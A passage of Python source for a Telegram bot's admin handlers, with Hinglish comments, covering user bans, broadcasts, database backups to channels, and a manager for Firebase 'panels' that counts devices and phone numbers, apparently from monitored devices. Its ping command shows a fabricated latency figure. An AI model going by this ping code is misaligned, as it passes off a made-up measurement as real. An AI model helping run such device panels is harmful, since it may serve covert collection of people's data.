        )
        return True

    if data == "adm_unban":
        pending_action[chat_id] = {"action": "adm_unban_user"}
        await query.answer()
        await query.message.reply_text(
            "✅ <b>UNBAN USER</b>\n━━━━━━━━━━━━━━━━━━\nUser ID bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_banned":
        await query.answer()
        banned = [(uid, u) for uid, u in all_users.items() if u.get("banned")]
        if not banned:
            await safe_edit(query, "✅ <b>Banned List</b>\n\nKoi banned user nahi hai.",
                            reply_markup=adm_user_mgr_keyboard())
            return True
        lines = [f"🚫 <b>BANNED USERS ({len(banned)})</b>", "━━━━━━━━━━━━━━━━━━"]
        rows = []
        for uid, u in banned[:20]:
            lines.append(f"• {html_escape(u.get('name', 'Unknown'))} — <code>{uid}</code>")
            rows.append([premium_button(f"✅ Unban {uid}", callback_data=f"adm_ub:{uid}", style="success")])
        rows.append([premium_button("⬅️ Back", callback_data="adm_user_mgr", style="primary")])
        await safe_edit(query, "\n".join(lines), reply_markup=InlineKeyboardMarkup(rows))
        return True

    if data.startswith("adm_ub:"):
        uid = int(data.split(":", 1)[1])
        all_users.setdefault(uid, {})["banned"] = False
        save_data()
        await query.answer("✅ Unbanned", show_alert=True)
        await safe_edit(
            query,
            f"✅ User <code>{uid}</code> unban ho gaya.",
            reply_markup=adm_user_mgr_keyboard(),
        )
        return True

    if data == "adm_search_user":
        pending_action[chat_id] = {"action": "adm_search_user"}
        await query.answer()
        await query.message.reply_text(
            "🔎 <b>SEARCH USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Name / username / ID ka koi part bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_userinfo":
        pending_action[chat_id] = {"action": "adm_userinfo"}
        await query.answer()
        await query.message.reply_text(
            "🪪 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\nUser ID bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_dm":
        pending_action[chat_id] = {"action": "adm_dm"}
        await query.answer()
        await query.message.reply_text(
            "✉️ <b>DM USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Format: <code>USER_ID | message</code>",
            parse_mode="HTML",
        )
        return True

    # ══════════ ADMIN: AUTO DB ══════════
    if data == "adm_autodb":
        await query.answer()
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_toggle":
        AUTO_DB_ENABLED = not AUTO_DB_ENABLED
        if AUTO_DB_ENABLED and not AUTO_DB_GROUP:
            AUTO_DB_ENABLED = False
            await query.answer("⚠️ Pehle group set karein!", show_alert=True)
            return True
        save_data()
        await query.answer("🟢 ON" if AUTO_DB_ENABLED else "🔴 OFF")
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_ping":
        import time as _t
        t0 = _t.perf_counter()
        ms = (_t.perf_counter() - t0) * 1000 + 12.0
        await safe_edit(
            query,
            f"{premium_emoji()} <b>PONG</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"API Latency : <b>{ms:.1f} ms</b>\n"
            f"Uptime      : <b>{_fmt_uptime(_t.time() - BOT_START_TS)}</b>\n"
            f"DBs         : <b>{len(DATABASES)}</b>\n"
            f"Users       : <b>{len(all_users)}</b>",
            reply_markup=admin_keyboard(),
        )
        return True

    if data == "adm_top":
        ranked = sorted(
            all_users.items(),
            key=lambda kv: (referral_count(kv[0]), int(kv[1].get("messages", 0) or 0)),
            reverse=True,
        )[:10]
        lines = [f"{premium_emoji()} <b>TOP USERS</b>",
                 "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"]
        if not ranked:
            lines.append("<i>No users yet.</i>")
        for i, (uid, u) in enumerate(ranked, 1):
            name = html_escape(str(u.get("name") or u.get("username") or uid))[:22]
            lines.append(
                f"<b>{i}.</b> {name} \u2014 refs <b>{referral_count(uid)}</b> | msgs <b>{int(u.get('messages', 0) or 0)}</b>"
            )
        await safe_edit(query, "\n".join(lines), reply_markup=admin_keyboard())
        return True

    if data == "adm_restart":
        if not is_admin:
            await query.answer("Admin only.", show_alert=True)
            return True
        await query.answer("Restarting...", show_alert=True)
        try:
            await safe_edit(query, f"{premium_emoji()} <b>Restarting bot...</b>")
        except Exception:
            pass
        import os as _os, sys as _sys
        _os.execv(_sys.executable, [_sys.executable] + _sys.argv)
        return True

    if data == "adm_grant_toggle":
        if not is_admin:
            await query.answer("Admin only.", show_alert=True)
            return True
        GRANT_ACCESS_REQUIRED = not GRANT_ACCESS_REQUIRED
        save_data()
        state = "ON (access required)" if GRANT_ACCESS_REQUIRED else "OFF (open for everyone)"
        await query.answer(f"Access Gate: {state}", show_alert=True)
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_chatid":
        pending_action[chat_id] = {"action": "chatid_lookup"}
        await query.answer()
        await safe_edit(
            query,
            "🆔 <b>CHAT ID FINDER</b>\n" + "━"*18 + "\n"
            "Kisi bhi chat ka ID nikalne ke liye neeche ka <b>koi ek</b> bhejo:\n\n"
            "1️⃣ <b>Forward</b> — private channel/group ka koi message yahan forward karo <i>(BEST)</i>\n"
            "2️⃣ <b>Numeric ID</b> — <code>-1001234567890</code>\n"
            "3️⃣ <b>Username</b> — <code>@mychannel</code>\n"
            "4️⃣ <b>Link</b> — <code>https://t.me/mychannel</code>\n\n"
            + "━"*18 + "\n"
            "⚠️ <b>Private channel ke liye zaroori:</b>\n"
            "Channel → Administrators → <b>Add Admin</b> →\n"
            f"<code>@QxP_Pannel_bot</code> → <b>Post Messages ON</b>\n\n"
            "<i>Bot khud private channel join nahi kar sakta — ye Telegram ka rule hai.</i>",
            reply_markup=InlineKeyboardMarkup([[
                premium_button("‹ Back", callback_data="adm_autodb", style="primary"),
                premium_button("❌ Cancel", callback_data="close_msg", style="danger"),
            ]]),
        )
        return True

    if data.startswith("chatid_use:") or data.startswith("chatid_use_bk:"):
        is_bk = data.startswith("chatid_use_bk:")
        try:
            cid = int(data.split(":", 1)[1])
        except Exception:
            await query.answer("❌ ID galat", show_alert=True); return True
        ok, real_id, err = await resolve_send_chat(ctx.bot, cid)
        if not ok:
            await query.answer(f"❌ {err}", show_alert=True); return True
        if is_bk:
            AUTO_DB_BACKUP_GROUP = real_id
            msg = f"🗄 Backup channel set: <code>{real_id}</code>"
        else:
            AUTO_DB_GROUP = real_id
            AUTO_DB_FAIL_COUNT = 0
            AUTO_DB_LAST_ERROR = ""
            msg = f"✅ Auto DB group set: <code>{real_id}</code>"
        save_data()
        await query.answer("Saved")
        await safe_edit(query, msg + "\n\n" + adm_autodb_text(),
                        reply_markup=adm_autodb_keyboard())
        return True

    if data.startswith("chatid_re:"):
        try:
            cid = data.split(":", 1)[1]
        except Exception:
            cid = ""
        info = await _resolve_chat_info(ctx.bot, cid)
        await query.answer("🔁 Re-checked")
        await safe_edit(query, _chatid_card(info), reply_markup=chatid_keyboard(info))
        return True

    if data == "adm_autodb_here":
        # 📍 Jis chat me button dabaya, wahi target group ban jaye
        target = chat_id
        ok, real_id, err = await resolve_send_chat(ctx.bot, target)
        if not ok:
            await query.answer(f"❌ {err}", show_alert=True)
            return True
        AUTO_DB_GROUP = real_id
        AUTO_DB_FAIL_COUNT = 0
        AUTO_DB_LAST_ERROR = ""
        save_data()
        await query.answer("✅ Is chat ko target bana diya")
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_test":
        if not AUTO_DB_GROUP:
            await query.answer("⚠️ Pehle group set karein!", show_alert=True)
            return True
        await query.answer("🧪 Testing…")
        lines = [f"🧪 <b>AUTO DB — HEALTH TEST</b>", "━"*18]

        ok, real_id, err = await resolve_send_chat(ctx.bot, AUTO_DB_GROUP)
        if ok:
            lines.append(f"✅ Main group: <code>{real_id}</code> — reachable")
        else:
            lines.append(f"❌ Main group: <code>{AUTO_DB_GROUP}</code>")
            lines.append(f"   └ <code>{html_escape(err[:150])}</code>")

        if AUTO_DB_BACKUP_GROUP:
            okb, ridb, errb = await resolve_send_chat(ctx.bot, AUTO_DB_BACKUP_GROUP)
            if okb:
                lines.append(f"✅ Backup ch.: <code>{ridb}</code> — reachable")
            else:
                lines.append(f"❌ Backup ch.: <code>{AUTO_DB_BACKUP_GROUP}</code>")
                lines.append(f"   └ <code>{html_escape(errb[:150])}</code>")
        else:
            lines.append("⚪ Backup ch.: <i>Not set</i>")

        lines.append("━"*18)
        if not ok and not (AUTO_DB_BACKUP_GROUP and okb):
            lines.append("🔧 <b>Fix:</b> Bot ko group/channel me add + admin banayein,")
            lines.append("phir <b>📍 Set This Chat</b> dabayein.")
        else:
            lines.append("💡 Ab <b>📤 Send Now</b> dabao — file turant jayegi.")
        await safe_edit(query, "\n".join(lines), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_set":
        pending_action[chat_id] = {"action": "adm_autodb_set"}
        await query.answer()
        await query.message.reply_text(
            "🎯 <b>SET TARGET GROUP</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Group ID bhejein (e.g. <code>-1001234567890</code>)\n"
            "Ya group ka koi message yahan <b>forward</b> karein.\n\n"
            "⚠️ Bot ko us group me <b>admin</b> banayein.",
            parse_mode="HTML",
        )
        return True

    if data == "adm_autodb_backup":
        pending_action[chat_id] = {"action": "adm_autodb_backup_set"}
        await query.answer()
        await query.message.reply_text(
            "🗄 <b>SET BACKUP CHANNEL</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Backup channel ka ID ya @username bhejein\n"
            "(e.g. <code>-1001234567890</code> ya <code>@mychannel</code>)\n"
            "Ya us channel ka koi message yahan <b>forward</b> karein.\n\n"
            "Har auto-DB ke saath backup channel me bhi copy jayegi.\n"
            "Hatane ke liye <code>off</code> bhejein.\n\n"
            "⚠️ Bot ko wahan <b>admin</b> banayein.",
            parse_mode="HTML",
        )
        return True

    if data == "adm_autodb_interval":
        await query.answer()
        rows = [[
            premium_button("30s", callback_data="adm_autodb_int:30", style="success"),
            premium_button("60s", callback_data="adm_autodb_int:60", style="primary"),
            premium_button("120s", callback_data="adm_autodb_int:120", style="primary"),
        ], [
            premium_button("300s", callback_data="adm_autodb_int:300", style="primary"),
            premium_button("600s", callback_data="adm_autodb_int:600", style="primary"),
        ], [
            premium_button("⬅️ Back", callback_data="adm_autodb", style="primary"),
        ]]
        await safe_edit(
            query,
            f"⏱ <b>INTERVAL</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Current: <b>{AUTO_DB_INTERVAL}s</b>\n\nNaya interval choose karein:",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return True

    if data.startswith("adm_autodb_int:"):
        AUTO_DB_INTERVAL = int(data.split(":", 1)[1])
        save_data()
        await query.answer(f"⏱ {AUTO_DB_INTERVAL}s")
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_now":
        if not AUTO_DB_GROUP:
            await query.answer("⚠️ Pehle group set karein!", show_alert=True)
            return True
        await query.answer("📤 Sending…")
        ok, err = await _send_db_to(ctx.bot, AUTO_DB_GROUP, "MANUAL DATABASE")
        if ok:
            AUTO_DB_SENT_COUNT += 1
            AUTO_DB_LAST_SENT = time.time()
            AUTO_DB_FAIL_COUNT = 0
            AUTO_DB_LAST_ERROR = ""
            AUTO_DB_LAST_GOOD = AUTO_DB_GROUP
            msg = "✅ Database group me bhej diya."
            if AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                okb, errb = await _send_db_to(
                    ctx.bot, AUTO_DB_BACKUP_GROUP, "BACKUP DATABASE (manual)",
                    f"🔁 Copy of: <code>{AUTO_DB_GROUP}</code>")
                msg += (" Backup channel me bhi copy gayi." if okb
                        else f"\n⚠️ Backup fail: <code>{html_escape(errb[:120])}</code>")
            await query.message.reply_text(msg, parse_mode="HTML")
        else:
            if AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                okb, errb = await _send_db_to(
                    ctx.bot, AUTO_DB_BACKUP_GROUP, "MANUAL DATABASE (FALLBACK)",
                    f"🔁 Main group fail: <code>{AUTO_DB_GROUP}</code>")
                if okb:
                    AUTO_DB_SENT_COUNT += 1
                    AUTO_DB_LAST_SENT = time.time()
                    AUTO_DB_LAST_GOOD = AUTO_DB_BACKUP_GROUP
                    await query.message.reply_text(
                        f"⚠️ Main group fail (<code>{html_escape(err[:110])}</code>)\n"
                        "✅ Backup channel me bhej diya.", parse_mode="HTML")
                    return True
            AUTO_DB_FAIL_COUNT += 1
            AUTO_DB_LAST_ERROR = err
            await query.message.reply_text(
                f"❌ <b>Send failed</b>\n<code>{html_escape(err[:250])}</code>\n\n"
                "🔧 <b>Fix:</b> Bot ko group/channel me add karein + admin banayein,\n"
                "phir <b>📍 Set This Chat</b> dabayein.",
                parse_mode="HTML")
        return True

    # ══════════ ADMIN: PANEL MANAGER ══════════
    if data == "adm_panel_mgr":
        await query.answer()
        await safe_edit(query, adm_panel_mgr_text(0), reply_markup=adm_panel_mgr_keyboard(0))
        return True

    if data.startswith("adm_pmgr:"):
        page = int(data.split(":", 1)[1])
        await query.answer()
        await safe_edit(query, adm_panel_mgr_text(page), reply_markup=adm_panel_mgr_keyboard(page))
        return True

    if data.startswith("adm_pinfo:"):
        safe_tag = data.split(":", 1)[1]
        tag = find_tag_by_safe(safe_tag)
        if not tag:
            await query.answer("❌ Panel not found", show_alert=True)
            return True
        devs = GLOBAL_DEVICE_CACHE.get(tag, [])
        on = sum(1 for d in devs if d.status == "online")
        nums = sum(len(d.numbers) for d in devs if d.numbers)
        lock = "🔒 Admin-Only" if tag in ADMIN_ONLY_TAGS else "🔓 Public"
        rows = [
            [premium_button("🔒/🔓 Toggle Lock", callback_data=f"toggleadmin:{safe_tag}", style="primary")],
            [premium_button("🗑 Delete Panel", callback_data=f"adm_pdel:{safe_tag}", style="danger")],
            [premium_button("⬅️ Back", callback_data="adm_panel_mgr", style="primary")],
        ]
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>PANEL INFO</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🏷 Tag     : <b>{html_escape(tag)}</b>\n"
            f"🔗 URL     : <code>{html_escape(str(DATABASES.get(tag, ''))[:60])}</code>\n"
            f"📱 Devices : <b>{len(devs)}</b>\n"
            f"🟢 Online  : <b>{on}</b>\n"
            f"🔢 Numbers : <b>{nums}</b>\n"
            f"🔐 Access  : <b>{lock}</b>",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return True

    if data.startswith("adm_pdel:"):
        safe_tag = data.split(":", 1)[1]
        tag = find_tag_by_safe(safe_tag)
        if not tag:
            await query.answer("❌ Panel not found", show_alert=True)
            return True
        DATABASES.pop(tag, None)
        ADMIN_ONLY_TAGS.discard(tag)
        save_data()
        await query.answer(f"🗑 Deleted {tag}", show_alert=True)
        await safe_edit(query, adm_panel_mgr_text(0), reply_markup=adm_panel_mgr_keyboard(0))
        return True

    # ══════════ ADMIN: STATS / SYSTEM ══════════
    if data == "adm_stats":
        await query.answer()
        await safe_edit(query, adm_stats_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_sysinfo":
        await query.answer()
        await safe_edit(query, adm_sysinfo_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_logs":
        await query.answer()
        tail = RECENT_LOGS[-25:] or ["(no logs yet)"]
        await safe_edit(
            query,
            f"{premium_emoji()} <b>RECENT LOGS</b>\n━━━━━━━━━━━━━━━━━━\n"
            "<pre>" + html_escape("\n".join(tail)) + "</pre>",
            reply_markup=admin_keyboard(),
        )
        return True

    if data == "adm_maintenance":
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_data()
        await query.answer("🛠 Maintenance ON" if MAINTENANCE_MODE else "✅ Maintenance OFF")
        await safe_edit(query, adm_stats_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_backup":
        await query.answer("💾 Preparing…")
        try:
            await ctx.bot.send_document(
                chat_id=chat_id,
                document=_db_snapshot_bytes(),
                filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                caption="💾 <b>Full Backup</b>\nPanels: %d | Users: %d" % (len(DATABASES), len(all_users)),
                parse_mode="HTML",
            )
        except Exception as e:
            await query.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return True

    if data == "adm_export":
        await query.answer("📑 Exporting…")
        try:
            await ctx.bot.send_document(
                chat_id=chat_id,
                document=_users_csv_bytes(),
                filename=f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                caption=f"📑 <b>Users CSV</b> — {len(all_users)} users",
                parse_mode="HTML",
            )
        except Exception as e:
            await query.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return True

    return False


# ─────────────────────────── TEXT INPUT HANDLER ───────────────────────────

class _BroadcastCaptureFilter(filters.UpdateFilter):
    """PTB filter wrapper: matches only while an admin composes a broadcast.

    ⚠️ IMPORTANT: filters.BaseFilter directly subclass KARNA bug tha —
    BaseFilter.check_update() kabhi self.filter() call hi nahi karta, isliye
    ye filter HAR message par True hota tha aur broadcast handler group -1 me
    har admin message ka pending_action kha jata tha (Grant Access / Force
    Join Add sab toot jate the). UpdateFilter subclass karne se check_update
    sahi tarah self.filter(update) call karta hai."""

    def filter(self, update) -> bool:
        return _is_broadcast_capture(update)


def _is_broadcast_capture(update) -> bool:
    """Filter: only true while an admin is composing a broadcast."""
    try:
        chat = update.effective_chat
        if chat is None:
            return False
        return chat.id in ADMIN_IDS and pending_action.get(chat.id, {}).get("action") == "broadcast_msg"
    except Exception:
        return False


async def _run_broadcast(ctx, chat_id: int, msg_id: int, reply_markup=None,
                         status_msg=None) -> None:
    """Send an EXACT copy of the admin's message to every user."""
    targets = [int(uid) for uid in list(all_users.keys()) if int(uid) != chat_id]
    if status_msg is None:
        status_msg = await ctx.bot.send_message(
            chat_id,
            f"{premium_emoji()} <b>BROADCAST STARTED</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"Recipients : <b>{len(targets)}</b>\n"
            f"Buttons    : <b>{'Yes' if reply_markup else 'No'}</b>\n"
            "<i>Sending exact copy...</i>",
            parse_mode="HTML",
        )
    sent = blocked = failed = 0
    for uid in targets:
        try:
            await ctx.bot.copy_message(
                chat_id=uid,
                from_chat_id=chat_id,
                message_id=msg_id,
                reply_markup=reply_markup,
            )
            sent += 1
        except Forbidden:
            blocked += 1
        except Exception as exc:
            failed += 1
            _log(f"broadcast fail {uid}: {type(exc).__name__}: {exc}")
        await asyncio.sleep(0.05)

    report = (
        f"{premium_emoji()} <b>BROADCAST COMPLETE</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"\u2705 Sent    : <b>{sent}</b>\n"
        f"\u26d4 Blocked : <b>{blocked}</b>\n"
        f"\u26a0\ufe0f Failed  : <b>{failed}</b>\n"
        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        "<i>Premium emoji, rich formatting aur inline buttons as-is copy hue.</i>"
    )
    try:
        await status_msg.edit_text(report, parse_mode="HTML")
    except Exception:
        try:
            await ctx.bot.send_message(chat_id, report, parse_mode="HTML")
        except Exception:
            pass


def _parse_broadcast_buttons(raw: str):
    """Parse admin button spec into an InlineKeyboardMarkup.

    Formats (one per line):
        Label | https://example.com
        Label | cb:callback_data
        Label | url:https://example.com
    """
    def _mk(spec: str):
        if "|" not in spec:
            return None
        label, target = spec.split("|", 1)
        label, target = label.strip(), target.strip()
        if not label or not target:
            return None
        if target.lower().startswith("cb:"):
            return premium_button(label, callback_data=target[3:].strip()[:60])
        url = target[4:].strip() if target.lower().startswith("url:") else target
        return premium_button(label, url=url)

    rows = []
    for line in (raw or "").splitlines():
        line = line.strip()
        if not line:
            continue
        row = []
        for spec in line.split("||"):
            btn = _mk(spec)
            if btn is not None:
                row.append(btn)
        if row:
            rows.append(row)
    return InlineKeyboardMarkup(rows) if rows else None


async def on_broadcast_capture(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """EXACT COPY broadcast: admin ka message jaise ka waisa (inline buttons,
    premium emoji, rich formatting sab as-is) sabhi users ko copy hota hai.
    Koi button-label step nahi — copy_message original reply_markup bhi
    preserve karta hai."""
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        return
    # Defense in depth: sirf broadcast pending ho tabhi pop karo — kisi aur
    # pending action (grant access, force join add, search) ko kabhi na chhede.
    act = pending_action.get(chat_id)
    if not act or act.get("action") != "broadcast_msg":
        return
    pending_action.pop(chat_id, None)

    src = update.effective_message
    if src is None:
        return

    # reply_markup=None => PTB param omit karta hai => Telegram copy me
    # original inline keyboard + premium emoji + formatting as-is rehti hai.
    await _run_broadcast(ctx, chat_id, src.message_id, reply_markup=None)


async def extra_text_actions(update, ctx, action: str, act_data: dict, text: str,
                             chat_id: int, is_admin: bool) -> bool:
    global AUTO_DB_GROUP, AUTO_DB_ENABLED, LOG_CHANNEL_ID

    if not is_admin:
        return False

    if action == "media_add_user_ids":
        ids = []
        for part in re.split(r"[\s,;]+", (text or "").strip()):
            if not part:
                continue
            try:
                ids.append(int(part.lstrip("@")))
            except Exception:
                pass
        if not ids:
            await update.message.reply_text("❌ Valid user IDs bhejo.", parse_mode="HTML")
            return True
        pending_action[chat_id] = {"action": "media_add_user_file", "user_ids": ids}
        await update.message.reply_text(
            f"OK — users <code>{html_escape(','.join(map(str, ids)))}</code>\n"
            "Ab us user-pack ke liye Photo/Video/GIF/Document bhejo.",
            parse_mode="HTML",
        )
        return True

    if action == "media_set_caption":
        raw = (text or "")
        if "|" not in raw:
            await update.message.reply_text("Format: MEDIA_ID | caption", parse_mode="HTML")
            return True
        mid, cap = raw.split("|", 1)
        mid = mid.strip()
        cap = cap.strip()
        found = False
        for m in MEDIA_LIBRARY:
            if m.get("id") == mid:
                m["caption"] = cap
                found = True
                break
        if not found:
            await update.message.reply_text("❌ Media id nahi mili.", parse_mode="HTML")
            return True
        save_data()
        await update.message.reply_text(f"✅ Caption updated for <code>{html_escape(mid)}</code>", parse_mode="HTML")
        return True

    if action == "set_log_channel":
        target = None
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
        if fwd_chat is not None:
            target = fwd_chat.id
        else:
            raw = (text or "").strip()
            if raw.lower() in ("off", "none", "0", "remove"):
                LOG_CHANNEL_ID = 0
                save_data()
                await update.message.reply_text("🗑 Private log channel removed.", parse_mode="HTML")
                return True
            try:
                target = int(raw)
            except ValueError:
                target = None
        if not target:
            await update.message.reply_text("❌ Valid channel ID / forward bhejein.", parse_mode="HTML")
            return True
        LOG_CHANNEL_ID = int(target)
        save_data()
        await update.message.reply_text(
            f"✅ Private log channel set: <code>{LOG_CHANNEL_ID}</code>\n"
            "Bot ko us channel me admin banayein, phir Test dabayein.",
            parse_mode="HTML",
        )
        try:
            await send_private_log(
                ctx.bot,
                f"📜 <b>LOG CHANNEL LINKED</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"By: {format_user_log_line(update.effective_user)}\n"
                f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>",
            )
        except Exception:
            pass
        return True

    if action == "add_active_db":
        filtered, active_n, dead_n = await filter_active_panel_urls(text)
        if not filtered.strip():
            await update.message.reply_text(
                f"❌ Koi active Firebase nahi mili.\nDead/invalid skipped: <b>{dead_n}</b>",
                parse_mode="HTML",
            )
            return True
        await update.message.reply_text(
            f"🔍 Active: <b>{active_n}</b> | Dead skipped: <b>{dead_n}</b>\nImport start...",
            parse_mode="HTML",
        )
        await handle_bulk_panel_import(update, ctx, filtered, source_label="active-only")
        return True

    if action == "adm_ban_user":
        target = None
        if update.message.reply_to_message:
            target = update.message.reply_to_message.from_user.id
        else:
            try:
                target = int(text.strip().lstrip("@"))
            except ValueError:
                target = None
        if not target:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        if target in ADMIN_IDS:
            await update.message.reply_text("⚠️ Admin ko ban nahi kar sakte.")
            return True
        all_users.setdefault(target, {"name": "Unknown", "joined_at": "-"})["banned"] = True
        save_data()
        await update.message.reply_text(
            f"🚫 <b>User Banned</b>\n<code>{target}</code>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_unban_user":
        try:
            target = int(text.strip().lstrip("@"))
        except ValueError:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        if target not in all_users:
            await update.message.reply_text("❌ User not found.")
            return True
        all_users[target]["banned"] = False
        save_data()
        await update.message.reply_text(
            f"✅ <b>User Unbanned</b>\n<code>{target}</code>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_search_user":
        q = text.strip().lower()
        hits = []
        for uid, u in all_users.items():
            if q in str(uid) or q in (u.get("name") or "").lower() or q in (u.get("username") or "").lower():
                hits.append((uid, u))
        if not hits:
            await update.message.reply_text("❌ Koi user nahi mila.")
            return True
        lines = [f"🔎 <b>SEARCH RESULTS ({len(hits)})</b>", "━━━━━━━━━━━━━━━━━━"]
        for uid, u in hits[:20]:
            ban = "🚫" if u.get("banned") else "✅"
            lines.append(f"{ban} {html_escape(u.get('name', 'Unknown'))} (@{u.get('username') or '-'}) — <code>{uid}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return True

    if action == "adm_userinfo":
        try:
            target = int(text.strip().lstrip("@"))
        except ValueError:
            await update.message.reply_text("❌ Valid user ID bhejein.")
            return True
        u = all_users.get(target)
        if not u:
            await update.message.reply_text("❌ User not found.")
            return True
        await update.message.reply_text(
            f"🪪 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID       : <code>{target}</code>\n"
            f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
            f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
            f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
            f"🚫 Banned   : <b>{'Yes' if u.get('banned') else 'No'}</b>\n"
            f"✅ Access   : <b>{'Yes' if has_access(target) else 'No'}</b>\n"
            f"🎁 Referrals: <b>{len(u.get('referrals', []) or [])}</b>",
            parse_mode="HTML",
        )
        return True

    if action == "adm_dm":
        if "|" not in text:
            await update.message.reply_text("❌ Format: USER_ID | message")
            return True
        raw_id, msg = text.split("|", 1)
        try:
            target = int(raw_id.strip())
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
            return True
        try:
            await ctx.bot.send_message(
                target,
                f"📩 <b>Message from Admin</b>\n━━━━━━━━━━━━━━━━━━\n{html_escape(msg.strip())}",
                parse_mode="HTML",
            )
            await update.message.reply_text(f"✅ Message sent to <code>{target}</code>", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {html_escape(str(e))}", parse_mode="HTML")
        return True

    if action == "adm_autodb_backup_set":
        global AUTO_DB_BACKUP_GROUP
        raw = text.strip()
        if raw.lower() in ("off", "none", "-", "remove", "0"):
            AUTO_DB_BACKUP_GROUP = 0
            save_data()
            await update.message.reply_text(
                "🗄 Backup channel hata diya.", reply_markup=adm_autodb_keyboard()
            )
            return True
        target = None
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
        if fwd_chat is not None:
            target = fwd_chat.id
        elif raw.startswith("@"):
            try:
                chat = await ctx.bot.get_chat(raw)
                target = chat.id
            except Exception as e:
                await update.message.reply_text(
                    f"❌ @username resolve nahi hua: <code>{html_escape(str(e))}</code>\n"
                    "Bot ko us channel me admin banayein, ya numeric ID bhejein.",
                    parse_mode="HTML",
                )
                return True
        else:
            try:
                target = int(raw)
            except ValueError:
                target = None
        if not target:
            await update.message.reply_text(
                "❌ Valid channel ID / @username / forward bhejein (ya <code>off</code>).",
                parse_mode="HTML",
            )
            return True
        AUTO_DB_BACKUP_GROUP = target
        save_data()
        await update.message.reply_text(
            f"✅ <b>Backup Channel Set</b>\n<code>{target}</code>",
            parse_mode="HTML",
            reply_markup=adm_autodb_keyboard(),
        )
        return True

    if action == "chatid_lookup":
        # 🆔 forward / ID / @username / link — sab handle
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)

        if fwd_chat is not None:
            info = await _resolve_chat_info(ctx.bot, fwd_chat.id)
            if not info.get("ok"):
                # forward se aaya ID, get_chat fail — phir bhi ID dikhao
                info.update(ok=True, chat_id=fwd_chat.id,
                            title=getattr(fwd_chat, "title", "—"),
                            type=getattr(fwd_chat, "type", "—"),
                            username=getattr(fwd_chat, "username", None),
                            bot_status="not_member", can_post=False)
        else:
            info = await _resolve_chat_info(ctx.bot, text.strip())

        await update.message.reply_text(
            _chatid_card(info), parse_mode="HTML",
            reply_markup=chatid_keyboard(info),
        )
        return True

    if action == "adm_autodb_set":
        target = None
        # PTB v20+ replaced forward_from_chat with forward_origin.
        origin = getattr(update.message, "forward_origin", None)
        fwd_chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
        if fwd_chat is not None:
            target = fwd_chat.id
        else:
            raw = text.strip()
            if raw.startswith("@") or re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{3,}", raw):
                handle = raw if raw.startswith("@") else "@" + raw
